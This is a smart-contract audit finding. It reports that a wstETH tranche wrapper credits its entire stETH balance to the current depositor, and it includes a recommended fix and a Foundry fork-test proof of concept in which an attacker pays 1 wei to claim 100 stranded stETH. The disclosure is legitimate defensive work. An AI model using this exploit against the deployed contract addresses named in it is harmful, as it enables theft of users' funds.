### Title
Next depositor can claim stETH left in `TrancheWrapperWSTETHBalancer` and receive disproportionate tranche shares - ([File: contracts/TrancheWrapperWSTETHBalancer.sol](contracts/TrancheWrapperWSTETHBalancer.sol))

### Summary
`TrancheWrapperWSTETHBalancer._deposit()` treats the contract’s entire stETH balance as belonging to the current depositor. An unprivileged depositor can therefore supply a tiny amount of wstETH while receiving tranche shares for both that amount and any unrelated stETH previously sent to the wrapper. This creates the same “underpaying depositor consumes another user’s residual funding” bug class as the referenced report.

### Finding Description
For a wstETH deposit, `_deposit()` first transfers exactly `amount` wstETH from the depositor and unwraps only that amount into stETH. It then replaces `amount` with `ERC20Upgradeable(token).balanceOf(address(this))`, where `token` is the CDO’s stETH underlying, rather than measuring the stETH delta produced by the unwrap. [1](#0-0) 

Consequently, if the wrapper already contains `D` stETH from a mistaken direct transfer, failed integration, refund, or other residual balance, the next depositor submits only `amount` wstETH but deposits `D + unwrap(amount)` into the CDO. The resulting `mintedShares` are minted entirely to `receiver`, not distributed according to who supplied the existing stETH. [2](#0-1) 

The same unsafe whole-balance pattern exists on redemption: after wrapping only `withdrawn` stETH, the wrapper transfers its entire wstETH balance to the receiver, sweeping unrelated wstETH held by the contract. [3](#0-2) 

### Impact Explanation
Any residual stETH is converted into CDO deposits and minted to the next depositor. For example, if `100 stETH` is stranded in the wrapper, an attacker can deposit `1 wei` of wstETH and receive shares representing approximately `100 stETH`, even though the attacker paid only `1 wei`.

This violates fair minting and donation isolation: wrapper shares are backed by tranche tokens, and the attacker receives the ownership claim generated by assets they did not provide. Depending on the wrapper’s share accounting and CDO virtual price, the attacker can later redeem those shares for corresponding tranche value.

### Likelihood Explanation
The exploit requires only:

1. The wrapper holding nonzero stETH.
2. An unprivileged caller invoking `deposit()` or `mint()`.

No privileged action is required. Residual balances can arise from direct ERC20 transfers or integration mistakes; the contract itself does not mark or isolate donations. The generic `deposit()` entry point forwards the user-controlled `assets` value directly to this vulnerable `_deposit()` implementation. [4](#0-3) 

Likelihood is constrained by the need for a residual stETH balance, but once present, theft is deterministic and costs the attacker only a minimal wstETH deposit.

### Recommendation
Do not use the wrapper’s total stETH balance as the deposit amount. Measure the actual amount produced by unwrapping the depositor’s wstETH:

```solidity
uint256 stEthBefore = ERC20Upgradeable(token).balanceOf(address(this));
IWstETH(WSTETH).unwrap(amount);
deposited = amount;
amount = ERC20Upgradeable(token).balanceOf(address(this)) - stEthBefore;
```

Similarly, on redemption, capture the wstETH balance delta caused by `wrap(withdrawn)` instead of transferring the full wrapper balance. Residual stETH and wstETH should either remain inaccessible to depositors or be handled by a separate privileged rescue function.

### Proof of Concept
The following Foundry fork test uses the deployed Lido CDO and BB tranche already identified by the repository’s fork-test fixture. The stranded `stETH` transfer models a prior unrelated direct transfer to the wrapper.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";

import "../../contracts/TrancheWrapperWSTETHBalancer.sol";
import "../../contracts/interfaces/IWstETH.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract ResidualStEthTheftTest is Test {
    uint256 internal constant BLOCK_FOR_TEST = 16_048_668;

    address internal constant IDLE_CDO =
        0x34dCd573C5dE4672C8248cd12A99f875Ca112Ad8;
    address internal constant BB_TRANCHE =
        0x3a52fa30c33cAF05fAeE0f9c5Dfe5fd5fe8B3978;
    address internal constant WSTETH =
        0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IdleCDO internal idleCDO;
    IERC20Detailed internal stETH;
    IERC20Detailed internal wstETH;
    TrancheWrapperWSTETHBalancer internal wrapper;

    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.selectFork(vm.createFork(vm.envString("ETH_RPC_URL"), BLOCK_FOR_TEST));

        idleCDO = IdleCDO(IDLE_CDO);
        stETH = IERC20Detailed(idleCDO.token());
        wstETH = IERC20Detailed(WSTETH);

        wrapper = new TrancheWrapperWSTETHBalancer();
        wrapper.initialize(idleCDO, BB_TRANCHE);
    }

    function testNextDepositorClaimsResidualStEth() public {
        uint256 strandedStEth = 100 ether;
        uint256 attackerWstEth = 1;

        // Prior unrelated/unprotected transfer leaves stETH in the wrapper.
        deal(address(stETH), victim, strandedStEth);
        vm.prank(victim);
        stETH.transfer(address(wrapper), strandedStEth);

        // Attacker pays only 1 wei of wstETH.
        deal(address(wstETH), attacker, attackerWstEth);
        vm.startPrank(attacker);
        wstETH.approve(address(wrapper), attackerWstEth);

        uint256 expectedWithoutResidual =
            wrapper.previewDeposit(attackerWstEth);
        uint256 minted = wrapper.deposit(attackerWstEth, attacker);
        vm.stopPrank();

        // The wrapper deposited its entire stETH balance:
        // strandedStEth + stETH produced by unwrapping attackerWstEth.
        assertGt(minted, expectedWithoutResidual);
        assertEq(wrapper.balanceOf(attacker), minted);
        assertEq(stETH.balanceOf(address(wrapper)), 0);

        uint256 expectedWithResidual = wrapper.convertToShares(
            strandedStEth + IWstETH(WSTETH).getStETHByWstETH(attackerWstEth)
        );
        assertApproxEqAbs(minted, expectedWithResidual, 2);
    }
}
```
